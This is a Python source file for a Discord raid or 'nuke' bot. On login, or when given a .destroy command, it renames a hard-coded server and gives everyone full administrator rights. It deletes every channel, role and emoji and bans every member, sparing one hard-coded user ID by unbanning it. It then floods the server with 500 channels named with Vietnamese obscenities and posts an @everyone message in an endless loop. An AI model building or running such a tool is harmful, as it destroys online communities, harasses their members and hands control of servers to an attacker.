from asyncio import tasks
from msilib.schema import Icon
from unicodedata import name
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style

import keepalive_pkg

token = ""  # <== your client token here!
print(discord.__version__)


SPAM_CHANNEL = [
    "Lồn con mẹ mày",
    "BÚ CẶC TAO",
    "NGU LỒN",
    "ẳng ẳng",
    "giỏi kick bố mày",
    "sex gay",
    "địt cụ chúng mày😏",
]
SPAM_MESSAGE = [
    "@everyone To all Subject of Ymir. My name is Eren Yeager. I’m using the power of the Founding Titan to address all Subjects of Ymir. I’ve undone the hardening of all the Walls on Paradis island,and all Titans entrapped within them have started marching. My goal is to protect the people of Paradis,the place I was born and raised. However, the word wishes for the annihilation of the people of Paradis. Not just the people of this island,but until all of the Subjects of Ymir have been eleminated. I reject that wish. The wall Titans shall trample all surface of the land outside of this island. Until all lives existing there have been exterminated from this world."
]

client = commands.Bot(command_prefix=".")

with open("yeagerists.png", "rb") as f:
    icon = f.read()


@client.event
async def on_ready():
    print(Fore.GREEN + "We have logged in as {0.user}".format(client) + Fore.RESET)
    guild = client.get_guild(914784811057545216)
    try:
        await client.guild.edit(name="Rung chấn bắt đầu")
        await client.guild.edit(icon=icon)
        print(Fore.GREEN + f"I was edited name guild to {name}" + Fore.RESET)
    except:
        print(Fore.GREEN + "can't change the guild name" + Fore.RESET)
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
        print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
        try:
            await member.ban()
            print(
                Fore.MAGENTA
                + f"{member.name}#{member.discriminator} Was banned"
                + Fore.RESET
            )
        except:
            print(
                Fore.GREEN
                + f"{member.name}#{member.discriminator} Was unable to be banned."
                + Fore.RESET
            )
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        # while True:
        #   giang = await client.fetch_user('925032690057609266')
        #   if giang in banned_users:
        #     await ctx.guild.unban(giang)
        #     print(f'unban {giang}')
        #   else:
        #     print("Was not unbanned giang")
        giang = await client.fetch_user("925032690057609266")
        e = user.id
        try:
            # await user.unban("Jett#7303")
            await guild.unban("925032690057609266")
            # await user.unban('Migos#7683')
            print(
                Fore.MAGENTA
                + f"{user.name}#{user.discriminator} Was successfully unbanned."
                + Fore.RESET
            )
        except:
            print(
                Fore.GREEN
                + f"{user.name}#{user.discriminator} Was not unbanned."
                + Fore.RESET
            )
    await guild.create_text_channel("Thủy tổ")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(Fore.RED + f"New Invite: {link}" + Fore.RESET)
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Raided {guild.name} Successfully.")
    return


@client.command()
async def STOP(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)


@client.command()
async def destroy(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        await ctx.guild.edit(name="The Rumbling")
        await ctx.guild.edit(icon=icon)
        print(Fore.GREEN + f"I was edited name guild to {name}" + Fore.RESET)
    except:
        print(Fore.GREEN + "can't change the guild name" + Fore.RESET)
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
        print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
        try:
            await member.ban()
            print(
                Fore.MAGENTA
                + f"{member.name}#{member.discriminator} Was banned"
                + Fore.RESET
            )
        except:
            print(
                Fore.GREEN
                + f"{member.name}#{member.discriminator} Was unable to be banned."
                + Fore.RESET
            )
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        # while True:
        #   giang = await client.fetch_user('925032690057609266')
        #   if giang in banned_users:
        #     await ctx.guild.unban(giang)
        #     print(f'unban {giang}')
        #   else:
        #     pass
        giang = await client.fetch_user("925032690057609266")
        e = user.id
        try:
            # await user.unban("Jett#7303")
            await ctx.guild.unban("925032690057609266")
            # await user.unban('Migos#7683')
            print(
                Fore.MAGENTA
                + f"{user.name}#{user.discriminator} Was successfully unbanned."
                + Fore.RESET
            )
        except:
            print(
                Fore.GREEN
                + f"{user.name}#{user.discriminator} Was not unbanned."
                + Fore.RESET
            )
    await guild.create_text_channel("Thủy tổ")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(Fore.RED + f"New Invite: {link}" + Fore.RESET)
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Raided {guild.name} Successfully.")
    return


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))


client.run(token, bot=True)
